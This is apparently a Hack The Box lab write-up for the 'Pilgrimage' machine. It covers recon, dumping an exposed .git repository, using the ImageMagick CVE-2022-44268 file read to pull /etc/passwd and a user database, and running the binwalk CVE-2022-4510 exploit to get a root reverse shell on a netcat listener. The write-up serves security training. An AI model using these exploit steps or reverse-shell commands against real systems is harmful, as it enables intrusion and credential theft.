![pilgrimage.png](pilgrimage.png)

# Pilgrimage

## Enum
```bash
nmap -Pn -sC -sV 10.10.11.219 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 12:34 IST
Nmap scan report for 10.10.11.219
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
```
```bash
curl -I http://pilgrimage.htb/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 16 Jul 2023 11:35:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=c7068upa54g66of0918039908r; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```
```bash
dirsearch -u http://pilgrimage.htb                                                                                                                                                 130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/pilgrimage.htb/_23-07-16_12-42-09.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-07-16_12-42-09.log

Target: http://pilgrimage.htb/

[12:42:09] Starting:
[12:42:10] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/
[12:42:10] 403 -  555B  - /.git/
[12:42:10] 200 -   73B  - /.git/description
[12:42:10] 403 -  555B  - /.git/branches/
[12:42:10] 200 -   92B  - /.git/config
[12:42:10] 403 -  555B  - /.git/hooks/
[12:42:10] 200 -    2KB - /.git/COMMIT_EDITMSG
[12:42:10] 200 -   23B  - /.git/HEAD
[12:42:10] 403 -  555B  - /.git/info/
[12:42:10] 200 -  240B  - /.git/info/exclude
[12:42:10] 200 -  195B  - /.git/logs/HEAD
[12:42:10] 301 -  169B  - /.git/logs/refs/heads  ->  http://pilgrimage.htb/.git/logs/refs/heads/
[12:42:10] 200 -  195B  - /.git/logs/refs/heads/master
[12:42:10] 403 -  555B  - /.git/logs/
[12:42:10] 200 -    4KB - /.git/index
[12:42:10] 301 -  169B  - /.git/refs/heads  ->  http://pilgrimage.htb/.git/refs/heads/
[12:42:10] 200 -   41B  - /.git/refs/heads/master
[12:42:10] 301 -  169B  - /.git/logs/refs  ->  http://pilgrimage.htb/.git/logs/refs/
[12:42:10] 403 -  555B  - /.git/refs/
[12:42:10] 403 -  555B  - /.git/objects/
[12:42:10] 301 -  169B  - /.git/refs/tags  ->  http://pilgrimage.htb/.git/refs/tags/
[12:42:10] 403 -  555B  - /.ht_wsr.txt
[12:42:10] 403 -  555B  - /.htaccess.bak1
[12:42:10] 403 -  555B  - /.htaccess.orig
[12:42:10] 403 -  555B  - /.htaccess.sample
[12:42:10] 403 -  555B  - /.htaccess_orig
[12:42:10] 403 -  555B  - /.htaccess_extra
[12:42:10] 403 -  555B  - /.htaccess.save
[12:42:10] 403 -  555B  - /.htaccessBAK
[12:42:10] 403 -  555B  - /.htaccessOLD
[12:42:10] 403 -  555B  - /.htaccess_sc
[12:42:10] 403 -  555B  - /.htaccessOLD2
[12:42:10] 403 -  555B  - /.htpasswd_test
[12:42:10] 403 -  555B  - /.html
[12:42:10] 403 -  555B  - /.htm
[12:42:10] 403 -  555B  - /.htpasswds
[12:42:10] 403 -  555B  - /.httr-oauth
[12:42:14] 403 -  555B  - /admin/.htaccess
[12:42:16] 403 -  555B  - /administrator/.htaccess
[12:42:17] 403 -  555B  - /app/.htaccess
[12:42:17] 403 -  555B  - /assets/
[12:42:17] 301 -  169B  - /assets  ->  http://pilgrimage.htb/assets/
[12:42:20] 302 -    0B  - /dashboard.php  ->  /login.php
[12:42:23] 200 -    7KB - /index.php
[12:42:24] 200 -    6KB - /login.php
[12:42:24] 302 -    0B  - /logout.php  ->  /
[12:42:28] 200 -    6KB - /register.php
[12:42:31] 301 -  169B  - /tmp  ->  http://pilgrimage.htb/tmp/
[12:42:31] 403 -  555B  - /tmp/
[12:42:32] 403 -  555B  - /vendor/

Task Completed
```
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt \
  -u "http://pilgrimage.htb" \
  -H "Host: FUZZ.pilgrimage.htb" -mc all -fs 7621

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.pilgrimage.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 7621
________________________________________________

:: Progress: [397652/3000000] :: Job [1/1] :: 1324 req/sec :: Duration: [0:06:07] :: Errors: 0 ::
```
```bash
[blnkn@Kolossus](main %=):~/sec/htb/machines/pilgrimage/loot% python3 ~/git-dumper/git_dumper.py http://pilgrimage.htb/ .
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```
```bash
[blnkn@Kolossus](master):~/sec/htb/machines/pilgrimage/loot% ls -la
total 26972
drwxr-xr-x 5 blnkn blnkn     4096 Jul 16 12:41 .
drwxr-xr-x 4 blnkn blnkn     4096 Jul 16 12:41 ..
drwxr-xr-x 6 blnkn blnkn     4096 Jul 16 12:41 assets
-rwxr-xr-x 1 blnkn blnkn     5538 Jul 16 12:41 dashboard.php
drwxr-xr-x 7 blnkn blnkn     4096 Jul 16 12:41 .git
-rwxr-xr-x 1 blnkn blnkn     9250 Jul 16 12:41 index.php
-rwxr-xr-x 1 blnkn blnkn     6822 Jul 16 12:41 login.php
-rwxr-xr-x 1 blnkn blnkn       98 Jul 16 12:41 logout.php
-rwxr-xr-x 1 blnkn blnkn 27555008 Jul 16 12:41 magick
-rwxr-xr-x 1 blnkn blnkn     6836 Jul 16 12:41 register.php
drwxr-xr-x 4 blnkn blnkn     4096 Jul 16 12:41 vendor
```
```bash
git log --oneline
e1a40be (HEAD -> master) Pilgrimage image shrinking service initial commit.
```
```bash
git branch -la
* master
```
Spent some time on the code, there is a feature on the homepage that you can upload a file on to have it shrunk to 50% size with image magick, and if the user is logged in, the file is saved in the /shrunk folder, and a record is saved in an sqlite database of the images uploaded per user, users can see their own image on the dashboard. Even though this uses exec to use an imagemagick binary present at the root of the webserver, there doesn't seem to be any code injection possible in that exec call, all the database calls seem fine too, as they are all using prepared statements.

Looking through the code was an insteresting exercise, and I learned how to setup xdebug with codium to get proper php server debuging, here's my working xdebug config:
```bash
cat /etc/php/8.2/cli/conf.d/20-xdebug.ini
[xdebug]
zend_extension=xdebug.so
xdebug.start_with_requests=yes
xdebug.remote_log=/var/log/apache2/xdebug.log
xdebug.default_enable = 1
xdebug.remote_enable=1
xdebug.remote_port=9003
```

## ImageMagic foothold
This took me some time as I'm working on an arm machine, but I finally decided myself to spin up a droplet to try and see what exact version of imagemagick is comming with the app:
```bash
scp -i ~/.ssh/do magick root@161.35.43.182:~
magick                                                              100%   26MB   4.1MB/s   00:06
```
```bash
root@ubuntu-s-1vcpu-1gb-lon1-01:~# sudo apt-get install -y libfuse-dev
root@ubuntu-s-1vcpu-1gb-lon1-01:~# sudo apt-get install -y libharfbuzz-dev
```
```bash
root@ubuntu-s-1vcpu-1gb-lon1-01:~# ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```
```bash
searchsploit ImageMagick
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
GeekLog 2.x - 'ImageImageMagick.php' Remote File Inclusion          | php/webapps/3946.txt
ImageMagick - Memory Leak                                           | multiple/local/45890.sh
ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH)                   | windows/local/31688.pl
ImageMagick 6.9.3-9 / 7.0.1-0 - 'ImageTragick' Delegate Arbitrary C | multiple/local/39791.rb
ImageMagick 6.x - '.PNM' Image Decoding Remote Buffer Overflow      | linux/dos/25527.txt
ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow     | linux/dos/28383.txt
ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabil | multiple/dos/39767.txt
ImageMagick 7.1.0-49 - Arbitrary File Read                          | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                          | php/dos/51256.txt
Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution ( | php/webapps/51025.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
[https://github.com/voidz0r/CVE-2022-44268](https://github.com/voidz0r/CVE-2022-44268)  

I did the thing, and it works just fine
```bash
[blnkn@Kolossus](master %=):~/CVE-2022-44268% python3 file|grep sh$
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
```
I then used that to extract the database since we know it's sqlite and we know the path from the source code
```bash
cargo run "/var/db/pilgrimage"
```
```bash
sqlite3 database.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .databases
main: /home/blnkn/CVE-2022-44268/database.db r/w
sqlite> .tables
images  users
sqlite> select * from users;
emily|****chonkyboi***
bob|bob
a|a
```

## Binwalk privesc

Looking around with pspy64, there's a process called by root that's running a shell script called malwarescan.sh
```bash
emily@pilgrimage:~$ ls -la /usr/sbin/malwarescan.sh
-rwxr--r-- 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh
emily@pilgrimage:~$ file /usr/sbin/malwarescan.sh
/usr/sbin/malwarescan.sh: Bourne-Again shell script, ASCII text executable
```

That thing looks for new files created in `:/var/www/pilgrimage.htb/shrunk` and runs binwalk on them, if some blacklisted strings are found in the output of binwalk it removes the files.
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The binwalk version being used it 2.3.2
```bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ /usr/local/bin/binwalk --help|head

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...

Signature Scan Options:
    -B, --signature              Scan target file(s) for common file signatures
    -R, --raw=<str>              Scan target file(s) for the specified sequence of bytes
```

Which has a CVE
```bash
searchsploit binwalk
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                     | python/remote/51249.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It's point and shoot from there
```
[https://www.exploit-db.com/exploits/51249](https://www.exploit-db.com/exploits/51249)  
```bash
python3 binwalk-exploit.py hamster.png 10.10.14.218 4242

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```
```
scp binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk
emily@pilgrimage.htb's password:
binwalk_exploit.png                                                 100%  142KB 846.4KB/s   00:00
```
```bash
rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.219] 60718
id
uid=0(root) gid=0(root) groups=0(root)
```

